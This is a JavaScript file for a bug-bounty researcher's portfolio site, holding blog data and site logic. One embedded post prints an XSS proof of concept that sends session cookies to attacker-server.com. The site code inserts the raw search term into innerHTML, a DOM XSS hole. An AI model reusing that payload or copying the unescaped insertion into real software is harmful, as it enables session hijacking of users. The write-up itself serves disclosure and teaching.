// Main JavaScript for Milan's Portfolio

// Blog Data
const blogData = {
    "blogs": [
        {
            "id": 1,
            "title": "How I Found and Exploited an XSS Vulnerability in a Fortune 500 Company",
            "date": "2025-03-15",
            "image": "https://images.unsplash.com/photo-1550751827-4bd374c3f58b?w=1200&h=600&fit=crop&crop=center",
            "author": "Milan",
            "excerpt": "A detailed walkthrough of discovering a persistent XSS vulnerability through improper input sanitization and achieving remote code execution...",
            "readTime": "8 min read",
            "content": `
                <div class="blog-article">
                    <div class="article-header">
                        <p class="article-lead">Discover how a simple search parameter turned into a critical security vulnerability affecting thousands of users.</p>
                    </div>
                    
                    <p>In this detailed write-up, I'll walk you through my process of discovering a critical Cross-Site Scripting (XSS) vulnerability in a Fortune 500 company's web application and how I responsibly disclosed it through their bug bounty program.</p>
                    
                    <h2>The Target</h2>
                    <p>The target was a customer portal for a major financial services company. The application appeared well-secured at first glance, with proper authentication mechanisms and apparent input validation. However, as we'll see, appearances can be deceiving.</p>
                    
                    <div class="info-box">
                        <h4>💡 Key Insight</h4>
                        <p>Never assume security based on surface-level appearance. Always test thoroughly.</p>
                    </div>
                    
                    <h2>Reconnaissance Phase</h2>
                    <p>I began with standard reconnaissance techniques:</p>
                    
                    <ul class="styled-list">
                        <li><strong>Application Mapping:</strong> Using Burp Suite to understand the application structure</li>
                        <li><strong>Input Points:</strong> Identifying all user input points including forms, URL parameters, and headers</li>
                        <li><strong>Automated Testing:</strong> Running initial scans with OWASP ZAP and custom scripts</li>
                    </ul>
                    
                    <h2>The Discovery</h2>
                    <p>While testing the search functionality, I noticed that search terms were reflected in the page without proper encoding. A simple test payload confirmed the vulnerability:</p>
                    
                    <pre><code class="language-javascript">&lt;script&gt;alert('XSS')&lt;/script&gt;</code></pre>
                    
                    <p>To my surprise, this executed successfully, confirming the presence of an XSS vulnerability.</p>
                    
                    <h2>Exploitation</h2>
                    <p>I developed a proof-of-concept that demonstrated the severity of this issue:</p>
                    
                    <pre><code class="language-javascript">// Proof of Concept - Stealing Session Cookies
&lt;script&gt;
var img = new Image();
img.src = "https://attacker-server.com/steal?cookie=" + encodeURIComponent(document.cookie);
&lt;/script&gt;</code></pre>
                    
                    <div class="code-explanation">
                        <h5>Code Explanation:</h5>
                        <p>This payload creates an image element that sends the user's session cookie to an attacker-controlled server when executed.</p>
                    </div>
                    
                    <h2>Impact Assessment</h2>
                    <p>This vulnerability could allow an attacker to:</p>
                    
                    <div class="impact-grid">
                        <div class="impact-item">
                            <div class="impact-icon">🔓</div>
                            <h5>Session Hijacking</h5>
                            <p>Steal user session cookies and impersonate legitimate users</p>
                        </div>
                        <div class="impact-item">
                            <div class="impact-icon">⚡</div>
                            <h5>Account Takeover</h5>
                            <p>Perform actions on behalf of authenticated users</p>
                        </div>
                        <div class="impact-item">
                            <div class="impact-icon">💳</div>
                            <h5>Data Exposure</h5>
                            <p>Access sensitive financial information and transaction history</p>
                        </div>
                    </div>
                    
                    <h2>Responsible Disclosure Process</h2>
                    <p>I immediately reported this finding through the company's bug bounty program, providing:</p>
                    
                    <ol>
                        <li>Detailed vulnerability description with CVSS score</li>
                        <li>Step-by-step reproduction guide with screenshots</li>
                        <li>Proof-of-concept code demonstrating the exploit</li>
                        <li>Potential impact analysis and risk assessment</li>
                        <li>Recommended remediation steps</li>
                    </ol>
                    
                    <div class="timeline">
                        <h4>Timeline of Disclosure</h4>
                        <div class="timeline-item">
                            <div class="timeline-date">Day 1</div>
                            <div class="timeline-content">
                                <h5>Initial Report</h5>
                                <p>Submitted detailed vulnerability report</p>
                            </div>
                        </div>
                        <div class="timeline-item">
                            <div class="timeline-date">Day 2</div>
                            <div class="timeline-content">
                                <h5>Triaged</h5>
                                <p>Security team confirmed the issue and assigned P1 priority</p>
                            </div>
                        </div>
                        <div class="timeline-item">
                            <div class="timeline-date">Day 7</div>
                            <div class="timeline-content">
                                <h5>Resolved</h5>
                                <p>Vulnerability fixed with proper input sanitization</p>
                            </div>
                        </div>
                    </div>
                    
                    <h2>Resolution</h2>
                    <p>The company's security team responded within 24 hours, confirmed the issue, and implemented proper input sanitization. The vulnerability was fixed within one week, and I received a bounty for my findings.</p>
                    
                    <div class="key-takeaway">
                        <h3>📚 Key Takeaway</h3>
                        <p>Never underestimate the importance of proper input validation and output encoding, even in seemingly minor application features. A single unvalidated parameter can compromise an entire application's security.</p>
                    </div>
                </div>
            `,
            "tags": ["XSS", "Bug Bounty", "Web Security", "Vulnerability", "Penetration Testing"]
        },
        {
            "id": 2,
            "title": "A Beginner's Guide to Web Application Penetration Testing Methodology",
            "date": "2025-03-08", 
            "image": "https://images.unsplash.com/photo-1551288049-bebda4e38f71?w=1200&h=600&fit=crop&crop=center",
            "author": "Milan",
            "excerpt": "Learn the systematic approach to web application penetration testing, from reconnaissance to reporting, with practical examples and tools...",
            "readTime": "12 min read",
            "content": `<div class="blog-article">Professional penetration testing content would go here...</div>`,
            "tags": ["Penetration Testing", "Methodology", "Web Security", "Beginners Guide"]
        },
        {
            "id": 3,
            "title": "Top 5 Custom Security Tools Every Bug Hunter Should Have in Their Arsenal",
            "date": "2025-03-01",
            "image": "https://images.unsplash.com/photo-1563013544-824ae1b704d3?w=1200&h=600&fit=crop&crop=center",
            "author": "Milan",
            "excerpt": "Discover the essential custom tools and scripts that can significantly improve your efficiency in finding and exploiting security vulnerabilities...",
            "readTime": "10 min read",
            "content": `<div class="blog-article">Security tools content would go here...</div>`,
            "tags": ["Security Tools", "Automation", "Bug Hunting", "Custom Scripts"]
        },
        {
    "id": 4,
    "title": "From Informative to Critical: The Unsubscribe Token Vulnerability That Was Overlooked",
    "date": "2025-03-22",
    "image": "https://images.unsplash.com/photo-1550751827-4bd374c3f58b?w=1200&h=600&fit=crop&crop=center",
    "author": "Milan",
    "excerpt": "A frustrating journey of discovering a PII leak and mass unsubscription flaw in a third-party service, only to have it initially dismissed as 'informative'.",
    "readTime": "7 min read",
    "content": "<div class=\"blog-article\">\n    <div class=\"article-header\">\n        <p class=\"article-lead\">How a simple unsubscription link revealed sensitive user data and a flawed security assessment process.</p>\n    </div>\n    \n    <p>Hello everyone,</p>\n    <p>Today, I'll share a recent bug bounty experience that was both technically interesting and frustrating in its outcome. The target was a major service (let's call it <strong>example.com</strong>), though due to security and disclosure reasons, I'm hiding the actual domain.</p>\n    \n    <h2>The Reconnaissance</h2>\n    <p>While hunting on a public program last week, I began by enumerating all endpoints and external links used by the main application. Using tools like Burp Suite and custom crawlers, I gathered every URL the site interacted with.</p>\n    \n    <img src=\"https://images.unsplash.com/photo-1627398242454-45a1465c2479?w=1000&auto=format&fit=crop\" alt=\"Burp Suite Interface\" style=\"width:100%; border-radius:8px; margin:20px 0;\">\n    <p class=\"image-caption\">Using Burp Suite to map external endpoints and third-party services.</p>\n    \n    <p>One URL stood out—it pointed to a third-party service used by <strong>example.com</strong> for mailing purposes. The endpoint looked like this:</p>\n    \n    <pre><code class=\"language-http\">http://target.com/u{token}</code></pre>\n    \n    <h2>The Discovery</h2>\n    <p>Out of curiosity, I opened the link. To my surprise, there was <strong>no authentication or authorization</strong> required. The page allowed me to unsubscribe a user with a single click. Even more concerning—I could manipulate the token to unsubscribe <em>any user</em>.</p>\n    \n    <div class=\"info-box\">\n        <h4>⚠️ Immediate Red Flag</h4>\n        <p>An unauthenticated unsubscribe endpoint is a direct path to mass unsubscription attacks, email bombing, and user harassment.</p>\n    </div>\n    \n    <h2>Decoding the Token</h2>\n    <p>The token structure looked familiar—like a base64-encoded string. I decided to decode it:</p>\n    \n    <pre><code class=\"language-javascript\">// Example of decoded token content\n{\n  \"user_id\": \"12345\",\n  \"email\": \"user@example.com\",\n  \"domain\": \"client-domain.com\",\n  \"timestamp\": \"2025-03-15T10:30:00Z\",\n  \"pii_hash\": \"a1b2c3d4e5f6...\",\n  \"full_name\": \"John Doe\"\n}</code></pre>\n    \n    <p>The token wasn't encrypted—it was just <strong>encoded and compressed user data</strong>. Inside, I found:</p>\n    <ul class=\"styled-list\">\n        <li><strong>PII Information:</strong> Email, user ID, sometimes full name</li>\n        <li><strong>Timestamps:</strong> Subscription and expiration dates</li>\n        <li><strong>Hashes:</strong> Internal identifiers</li>\n        <li><strong>Domain Details:</strong> Source of the subscription</li>\n    </ul>\n    \n    <div class=\"impact-grid\">\n        <div class=\"impact-item\">\n            <div class=\"impact-icon\">📧</div>\n            <h5>Email Exposure</h5>\n            <p>Personal email addresses accessible via token decode</p>\n        </div>\n        <div class=\"impact-item\">\n            <div class=\"impact-icon\">🕵️</div>\n            <h5>PII Leak</h5>\n            <p>User identifiers and metadata exposed without encryption</p>\n        </div>\n        <div class=\"impact-item\">\n            <div class=\"impact-icon\">⚡</div>\n            <h5>Mass Unsubscription</h5>\n            <p>Ability to unsubscribe any user without verification</p>\n        </div>\n    </div>\n    \n    <h2>The Reporting Struggle</h2>\n    <p>Recognizing the severity, I checked if the affected third-party service had a public bug bounty program. They didn't. So, I emailed their security team directly with a detailed report.</p>\n    \n    <p>To their credit, they responded quickly and added me to a <strong>private program on HackerOne</strong>. I submitted the full report with:</p>\n    <ol>\n        <li>Vulnerability description and attack scenario</li>\n        <li>Proof-of-concept with decoded token samples (sanitized)</li>\n        <li>Impact on user privacy and service integrity</li>\n        <li>Remediation recommendations</li>\n    </ol>\n    \n    <div class=\"timeline\">\n        <h4>Timeline of Events</h4>\n        <div class=\"timeline-item\">\n            <div class=\"timeline-date\">Day 1</div>\n            <div class=\"timeline-content\">\n                <h5>Discovery & Initial Contact</h5>\n                <p>Found the vulnerability, emailed security team</p>\n            </div>\n        </div>\n        <div class=\"timeline-item\">\n            <div class=\"timeline-date\">Day 2</div>\n            <div class=\"timeline-content\">\n                <h5>Invited to Private Program</h5>\n                <p>Added to HackerOne private program, report submitted</p>\n            </div>\n        </div>\n        <div class=\"timeline-item\">\n            <div class=\"timeline-date\">Day 6</div>\n            <div class=\"timeline-content\">\n                <h5>Triaged as Informative</h5>\n                <p>Marked as low severity because \"we can't modify the token\"</p>\n            </div>\n        </div>\n    </div>\n    \n    <h2>The Frustrating Outcome</h2>\n    <p>Four days later, the team triaged the report and marked it as <strong>Informative</strong>.</p>\n    \n    <p>Their reasoning? <em>\"We can't modify the token.\"</em></p>\n    \n    <div class=\"info-box warning\">\n        <h4>🚨 Flawed Assessment</h4>\n        <p>This missed the point entirely. The issue wasn't about modifying the token—it was about:</p>\n        <ul>\n            <li>PII exposure through token decoding</li>\n            <li>Lack of authentication on unsubscribe actions</li>\n            <li>Predictable token structure enabling mass unsubscription</li>\n        </ul>\n    </div>\n    \n    <p><strong>F*CK!!</strong></p>\n    \n    <p>This dismissal highlights a common issue in bug bounty programs: focusing on exploit complexity over actual impact. An attacker doesn't need to modify the token—they can:</p>\n    <ul>\n        <li>Collect tokens from phishing campaigns</li>\n        <li>Use token reuse patterns to unsubscribe users en masse</li>\n        <li>Decode tokens to harvest PII for further attacks</li>\n    </ul>\n    \n    <h2>Key Takeaways</h2>\n    <div class=\"key-takeaway\">\n        <h3>📚 Lessons Learned</h3>\n        <ul>\n            <li><strong>Third-party services are part of your attack surface.</strong> Don't ignore external dependencies.</li>\n            <li><strong>Encryption ≠ Encoding.</strong> Base64 is not a security measure.</li>\n            <li><strong>Impact over complexity.</strong> A simple vulnerability can have severe consequences.</li>\n            <li><strong>Persistence pays.</strong> Even if a report is mishandled, document everything for future appeals or disclosures.</li>\n        </ul>\n    </div>\n    \n    <p>In the end, this was a classic case of a company underestimating a vulnerability because it seemed \"simple.\" But in security, simplicity often means scalability—and scalable attacks are the most dangerous.</p>\n    \n    <p>Stay curious, stay thorough, and don't let \"informative\" labels discourage you from digging deeper.</p>\n    \n    <p>Happy hunting,<br>Milan</p>\n</div>",
    "tags": ["Bug Bounty", "PII Leak", "Token Security", "Third-party Risk", "Informative Frustration"]
},
    ]
};

// Global variables for blog system
let currentView = 'latest';
let currentSearchTerm = '';

// ============================================
// SHARE FUNCTIONALITY - FIXED LINK GENERATION
// ============================================

function createShareUrl(blogId) {
    // Get the current page URL without any parameters
    const baseUrl = window.location.origin + window.location.pathname;
    // Create a direct link that goes to blog section with the specific blog
    return `${baseUrl}#blog?post=${blogId}`;
}

function addShareButton(blog) {
    return `
        <div class="blog-share-wrapper">
            <button class="share-link-btn" onclick="copyBlogLink(${blog.id})" title="Copy link to share">
                <i class="bi bi-link-45deg"></i>
                <span>Copy Link</span>
            </button>
            <span class="share-feedback" id="share-feedback-${blog.id}"></span>
        </div>
    `;
}

function copyBlogLink(blogId) {
    const shareUrl = createShareUrl(blogId);
    
    // Create temporary input element
    const tempInput = document.createElement('input');
    tempInput.value = shareUrl;
    document.body.appendChild(tempInput);
    tempInput.select();
    tempInput.setSelectionRange(0, 99999);
    
    try {
        // Try Clipboard API first
        navigator.clipboard.writeText(shareUrl).then(() => {
            showCopyFeedback(blogId);
        }).catch(() => {
            // Fallback for older browsers
            document.execCommand('copy');
            showCopyFeedback(blogId);
        });
    } catch (err) {
        // Final fallback
        document.execCommand('copy');
        showCopyFeedback(blogId);
    }
    
    // Clean up
    document.body.removeChild(tempInput);
}

function showCopyFeedback(blogId) {
    const feedbackEl = document.getElementById(`share-feedback-${blogId}`);
    if (feedbackEl) {
        feedbackEl.textContent = "✓ Link copied!";
        feedbackEl.style.opacity = "1";
        
        setTimeout(() => {
            feedbackEl.style.opacity = "0";
            setTimeout(() => {
                feedbackEl.textContent = "";
            }, 300);
        }, 2000);
    }
}

// Make function available globally
window.copyBlogLink = copyBlogLink;

// ============================================
// URL HANDLING FOR DIRECT BLOG LINKS
// ============================================

function handleDirectBlogLink() {
    // Check if URL has blog parameter
    const hash = window.location.hash;
    if (hash) {
        const match = hash.match(/#blog\?post=(\d+)/);
        if (match) {
            const blogId = parseInt(match[1]);
            const blog = blogData.blogs.find(b => b.id === blogId);
            if (blog) {
                // Scroll to blog section first
                const blogSection = document.getElementById('blog');
                if (blogSection) {
                    blogSection.scrollIntoView({ behavior: 'smooth' });
                }
                
                // Open the blog modal after a short delay
                setTimeout(() => {
                    openBlogModal(blogId);
                }, 800);
            }
        }
    }
}

// ============================================
// MAIN INITIALIZATION
// ============================================

document.addEventListener("DOMContentLoaded", () => {
    // Initialize AOS
    AOS.init({
        duration: 1000,
        once: true,
        offset: 100
    });

    // Initialize all components
    initNavbar();
    initScrollEffects();
    initContactForm();
    initBlogSystem();
    initStatisticsCounter();
    initOWASPTooltips();
    
    // Handle direct blog links
    handleDirectBlogLink();
});

// ============================================
// NAVBAR FUNCTIONALITY
// ============================================

function initNavbar() {
    const navbarLinks = document.querySelectorAll(".nav-link");
    const navbarCollapse = document.querySelector(".navbar-collapse");
    const navbarToggler = document.querySelector(".navbar-toggler");
    const navbar = document.querySelector(".navbar");

    navbarLinks.forEach(link => {
        link.addEventListener("click", () => {
            if (navbarCollapse.classList.contains("show")) {
                navbarToggler.click();
            }
        });
    });

    document.addEventListener('click', (e) => {
        if (navbarCollapse.classList.contains('show') && !navbar.contains(e.target)) {
            navbarToggler.click();
        }
    });

    window.addEventListener("scroll", () => {
        if (window.scrollY > 50) {
            navbar.classList.add("scrolled");
        } else {
            navbar.classList.remove("scrolled");
        }
    });
}

// ============================================
// SCROLL EFFECTS
// ============================================

function initScrollEffects() {
    const backToTop = document.querySelector(".back-to-top");

    window.addEventListener("scroll", () => {
        if (window.scrollY > 100) {
            backToTop.style.display = "block";
        } else {
            backToTop.style.display = "none";
        }
    });

    document.querySelectorAll('a[href^="#"]').forEach(anchor => {
        anchor.addEventListener('click', function(e) {
            const href = this.getAttribute('href');
            
            if (href === '#') return;
            
            e.preventDefault();
            const target = document.querySelector(href);
            if (target) {
                target.scrollIntoView({
                    behavior: 'smooth',
                    block: 'start'
                });
            }
        });
    });
}

// ============================================
// OWASP TOOLTIPS
// ============================================

function initOWASPTooltips() {
    const badges = document.querySelectorAll('.owasp-badge');
    
    badges.forEach(badge => {
        badge.addEventListener('mouseenter', function() {
            const tooltip = this.getAttribute('data-tooltip');
            this.setAttribute('title', tooltip);
        });
        
        badge.addEventListener('mouseleave', function() {
            this.removeAttribute('title');
        });
    });
}

// ============================================
// STATISTICS COUNTER
// ============================================

function initStatisticsCounter() {
    const statNumbers = document.querySelectorAll('.stat-number');
    
    const observer = new IntersectionObserver((entries) => {
        entries.forEach(entry => {
            if (entry.isIntersecting) {
                animateCounter(entry.target);
                observer.unobserve(entry.target);
            }
        });
    }, { threshold: 0.5 });
    
    statNumbers.forEach(counter => observer.observe(counter));
}

function animateCounter(counter) {
    const target = parseInt(counter.getAttribute('data-count'));
    const suffix = counter.getAttribute('data-suffix') || '+';
    const duration = 2000;
    const step = target / (duration / 16);
    
    let current = 0;
    const timer = setInterval(() => {
        current += step;
        if (current >= target) {
            counter.textContent = target + suffix;
            clearInterval(timer);
        } else {
            counter.textContent = Math.floor(current) + suffix;
        }
    }, 16);
}

// ============================================
// CONTACT FORM WITH EMAILJS - WORKING VERSION
// ============================================

function initContactForm() {
    const contactForm = document.getElementById("contactForm");
    const successPopup = document.getElementById("successPopup");
    const closePopup = document.getElementById("closePopup");

    // Your EmailJS credentials
    const EMAILJS_CONFIG = {
        PUBLIC_KEY: "2X9gef2Tudenoiugp",
        SERVICE_ID: "service_85d3r1y",
        TEMPLATE_ID: "template_ogzw9jc"
    };

    // Initialize EmailJS
    emailjs.init(EMAILJS_CONFIG.PUBLIC_KEY);

    if (contactForm) {
        contactForm.addEventListener("submit", function(e) {
            e.preventDefault();
            
            // Get form data - EXACT variable names as in your template
            const templateParams = {
                name: document.getElementById("name").value.trim(),
                email: document.getElementById("email").value.trim(),
                subject: document.getElementById("subject").value.trim(),
                message: document.getElementById("message").value.trim(),
                date: new Date().toLocaleDateString('en-US', { 
                    weekday: 'long', 
                    year: 'numeric', 
                    month: 'long', 
                    day: 'numeric',
                    hour: '2-digit',
                    minute: '2-digit'
                }),
                page_url: window.location.href
            };
            
            // Validate
            if (!templateParams.name || !templateParams.email || !templateParams.subject || !templateParams.message) {
                alert("Please fill in all fields.");
                return;
            }
            
            // Show loading state
            const submitBtn = this.querySelector('button[type="submit"]');
            const originalText = submitBtn.innerHTML;
            submitBtn.innerHTML = 'Sending...';
            submitBtn.disabled = true;
            
            console.log("Sending email with params:", templateParams);
            
            // Send email using EmailJS
            emailjs.send(
                EMAILJS_CONFIG.SERVICE_ID,
                EMAILJS_CONFIG.TEMPLATE_ID,
                templateParams
            )
            .then(function(response) {
                console.log('✅ SUCCESS!', response.status, response.text);
                successPopup.classList.add("active");
                contactForm.reset();
            })
            .catch(function(error) {
                console.error('❌ ERROR:', error);
                
                // Show detailed error
                let errorMsg = "Failed to send message. ";
                
                if (error.status === 0) {
                    errorMsg += "Check your internet connection.";
                } else if (error.status === 400) {
                    errorMsg += "Template variables don't match.";
                } else if (error.status === 401) {
                    errorMsg += "Invalid Public Key.";
                } else if (error.status === 404) {
                    errorMsg += "Service or Template not found.";
                } else {
                    errorMsg += `Error code: ${error.status}`;
                }
                
                alert(errorMsg + "\n\nEmail me directly at: gautammilan2024@gmail.com");
            })
            .finally(function() {
                // Reset button
                submitBtn.innerHTML = originalText;
                submitBtn.disabled = false;
            });
        });
    }

    // Close popup functionality
    if (closePopup) {
        closePopup.addEventListener("click", () => {
            successPopup.classList.remove("active");
        });
    }

    // Close popup when clicking outside
    window.addEventListener("click", (e) => {
        if (e.target === successPopup) {
            successPopup.classList.remove("active");
        }
    });
    
    // Test connection on page load
    testEmailJSConnection();
}

// Test EmailJS connection
function testEmailJSConnection() {
    console.log("Testing EmailJS connection...");
    console.log("Public Key:", "2X9gef2Tudenoiugp");
    console.log("Service ID:", "service_85d3r1y");
    console.log("Template ID:", "template_ogzw9jc");
    
    // Small test to verify connection
    setTimeout(() => {
        emailjs.init("2X9gef2Tudenoiugp");
        console.log("✅ EmailJS initialized successfully");
    }, 1000);
}

// ============================================
// BLOG SYSTEM
// ============================================

function initBlogSystem() {
    loadBlogs();
    
    document.getElementById('search-button').addEventListener('click', handleSearch);
    document.getElementById('clear-button').addEventListener('click', clearSearch);
    document.getElementById('view-all-btn').addEventListener('click', viewAllBlogs);
    document.getElementById('back-to-latest').addEventListener('click', backToLatest);
    
    const searchInput = document.getElementById('blog-search');
    if (searchInput) {
        searchInput.addEventListener('input', handleSearch);
    }
}

function getLatestBlogs() {
    return blogData.blogs
        .sort((a, b) => new Date(b.date) - new Date(a.date))
        .slice(0, 4);
}

function loadBlogs() {
    const blogContainer = document.getElementById('blog-container');
    const searchResultsInfo = document.getElementById('search-results-info');
    const noResultsMessage = document.getElementById('no-results-message');
    const viewAllButton = document.getElementById('view-all-btn');
    const backToLatestButton = document.getElementById('back-to-latest');
    const showingCount = document.getElementById('showing-count');
    const totalCount = document.getElementById('total-count');
    
    if (!blogContainer) return;

    blogContainer.innerHTML = '';
    
    let blogsToShow = [];
    
    if (currentView === 'latest') {
        blogsToShow = getLatestBlogs();
        if (searchResultsInfo) searchResultsInfo.style.display = 'none';
        if (viewAllButton) viewAllButton.style.display = 'inline-block';
        if (backToLatestButton) backToLatestButton.style.display = 'none';
    } 
    else if (currentView === 'all') {
        blogsToShow = blogData.blogs.sort((a, b) => new Date(b.date) - new Date(a.date));
        if (searchResultsInfo) searchResultsInfo.style.display = 'none';
        if (viewAllButton) viewAllButton.style.display = 'none';
        if (backToLatestButton) backToLatestButton.style.display = 'inline-block';
    }
    else if (currentView === 'search') {
        blogsToShow = searchBlogs(currentSearchTerm);
        if (searchResultsInfo) {
            searchResultsInfo.style.display = 'block';
            searchResultsInfo.innerHTML = `Found ${blogsToShow.length} results for "${currentSearchTerm}"`;
        }
        if (viewAllButton) viewAllButton.style.display = 'none';
        if (backToLatestButton) backToLatestButton.style.display = 'inline-block';
    }
    
    if (noResultsMessage) {
        noResultsMessage.style.display = blogsToShow.length === 0 ? 'block' : 'none';
    }
    
    if (showingCount) showingCount.textContent = blogsToShow.length;
    if (totalCount) totalCount.textContent = blogData.blogs.length;
    
    blogsToShow.forEach(blog => {
        const formattedDate = formatDate(blog.date);
        
        const blogHTML = `
            <div class="col-md-6 col-lg-4" data-aos="fade-up">
                <article class="blog-card">
                    <div class="blog-card-image">
                        <img src="${blog.image}" alt="${blog.title}">
                    </div>
                    
                    <div class="blog-card-content">
                        <div class="blog-meta">
                            <span class="blog-author">By ${blog.author}</span>
                            <span class="blog-date">${formattedDate}</span>
                        </div>
                        
                        <h3 class="blog-title">${blog.title}</h3>
                        <p class="blog-excerpt">${blog.excerpt}</p>
                        
                        <div class="blog-reading-info">
                            <span class="read-time">${blog.readTime}</span>
                        </div>
                        
                        <div class="blog-tags">
                            ${blog.tags.slice(0, 4).map(tag => `<span class="tag">${tag}</span>`).join('')}
                        </div>
                        
                        <div class="blog-actions">
                            ${addShareButton(blog)}
                            <a href="#" class="read-more-btn" onclick="openBlogModal(${blog.id})">
                                Read Full Story <i class="bi bi-arrow-right"></i>
                            </a>
                        </div>
                    </div>
                </article>
            </div>
        `;
        blogContainer.innerHTML += blogHTML;
    });
}

function searchBlogs(searchTerm) {
    if (!searchTerm.trim()) return [];
    
    const term = searchTerm.toLowerCase();
    return blogData.blogs.filter(blog => 
        blog.title.toLowerCase().includes(term) ||
        blog.excerpt.toLowerCase().includes(term) ||
        blog.content.toLowerCase().includes(term) ||
        blog.tags.some(tag => tag.toLowerCase().includes(term))
    ).sort((a, b) => new Date(b.date) - new Date(a.date));
}

function formatDate(dateString) {
    const date = new Date(dateString);
    const now = new Date();
    const diffTime = Math.abs(now - date);
    const diffDays = Math.ceil(diffTime / (1000 * 60 * 60 * 24));
    
    if (diffDays === 1) return 'Yesterday';
    if (diffDays < 7) return `${diffDays} days ago`;
    if (diffDays < 30) return `${Math.floor(diffDays / 7)} weeks ago`;
    
    const options = { month: 'short', day: 'numeric', year: 'numeric' };
    return date.toLocaleDateString('en-US', options);
}

function viewAllBlogs() {
    currentView = 'all';
    currentSearchTerm = '';
    const searchInput = document.getElementById('blog-search');
    if (searchInput) searchInput.value = '';
    loadBlogs();
}

function backToLatest() {
    currentView = 'latest';
    currentSearchTerm = '';
    const searchInput = document.getElementById('blog-search');
    if (searchInput) searchInput.value = '';
    loadBlogs();
}

function handleSearch() {
    const searchInput = document.getElementById('blog-search');
    if (!searchInput) return;
    
    const searchTerm = searchInput.value.trim();
    
    if (searchTerm === '') {
        currentView = 'latest';
        currentSearchTerm = '';
    } else {
        currentView = 'search';
        currentSearchTerm = searchTerm;
    }
    
    loadBlogs();
}

function clearSearch() {
    const searchInput = document.getElementById('blog-search');
    if (searchInput) searchInput.value = '';
    currentView = 'latest';
    currentSearchTerm = '';
    loadBlogs();
}

// ============================================
// BLOG MODAL
// ============================================

function openBlogModal(blogId) {
    const blog = blogData.blogs.find(b => b.id === blogId);
    if (!blog) return;

    const shareUrl = createShareUrl(blogId);
    const formattedDate = formatDate(blog.date);

    const modalHTML = `
        <div class="modal-dialog modal-xxl modal-dialog-centered modal-dialog-scrollable">
            <div class="modal-content blog-modal-content">
                <div class="modal-header blog-modal-header">
                    <div class="blog-header-content">
                        <span class="blog-date-modal">${formattedDate}</span>
                        <button class="share-link-btn share-btn-large" onclick="copyBlogLink(${blog.id})" title="Copy link to share">
                            <i class="bi bi-link-45deg"></i>
                            <span>Share Article</span>
                        </button>
                    </div>
                    <button type="button" class="close-btn" data-bs-dismiss="modal" aria-label="Close">
                        <i class="bi bi-x-lg"></i>
                    </button>
                </div>
                
                <div class="modal-body blog-modal-body">
                    <article class="blog-article-full">
                        <header class="article-header-full">
                            <h1 class="article-title-full">${blog.title}</h1>
                            <div class="article-meta-full">
                                <span class="article-author">By ${blog.author}</span>
                                <span class="article-read-time">${blog.readTime}</span>
                            </div>
                            <div class="article-featured-image">
                                <img src="${blog.image}" alt="${blog.title}">
                            </div>
                        </header>
                        
                        <div class="article-content-full">
                            ${blog.content}
                        </div>
                        
                        <footer class="article-footer-full">
                            <div class="article-tags-full">
                                <strong>Topics:</strong>
                                <div class="tags-container">
                                    ${blog.tags.map(tag => `<span class="article-tag">${tag}</span>`).join('')}
                                </div>
                            </div>
                            <div class="share-section">
                                <h5>Share This Article</h5>
                                <p>Copy the link below to share on any platform:</p>
                                <div class="share-link-container">
                                    <input type="text" readonly value="${shareUrl}" class="share-link-input" id="share-link-${blog.id}">
                                    <button class="copy-link-btn" onclick="copyInputLink(${blog.id})">
                                        <i class="bi bi-clipboard"></i> Copy
                                    </button>
                                </div>
                            </div>
                        </footer>
                    </article>
                </div>
                
                <div class="modal-footer blog-modal-footer">
                    <button type="button" class="close-article-btn" data-bs-dismiss="modal">
                        <i class="bi bi-arrow-left"></i> Back to Articles
                    </button>
                </div>
            </div>
        </div>
    `;

    const modal = document.getElementById('dynamicBlogModal');
    modal.innerHTML = modalHTML;
    
    const bsModal = new bootstrap.Modal(modal);
    bsModal.show();
    
    // Update URL hash for direct linking
    if (history.pushState) {
        window.history.pushState({}, '', `#blog?post=${blogId}`);
    }
}

function copyInputLink(blogId) {
    const input = document.getElementById(`share-link-${blogId}`);
    if (input) {
        input.select();
        input.setSelectionRange(0, 99999);
        
        navigator.clipboard.writeText(input.value).then(() => {
            const btn = input.nextElementSibling;
            const originalHTML = btn.innerHTML;
            btn.innerHTML = '<i class="bi bi-check"></i> Copied!';
            btn.style.background = '#28a745';
            
            setTimeout(() => {
                btn.innerHTML = originalHTML;
                btn.style.background = '';
            }, 2000);
        });
    }
}

// Make functions available globally
window.openBlogModal = openBlogModal;
window.copyInputLink = copyInputLink;

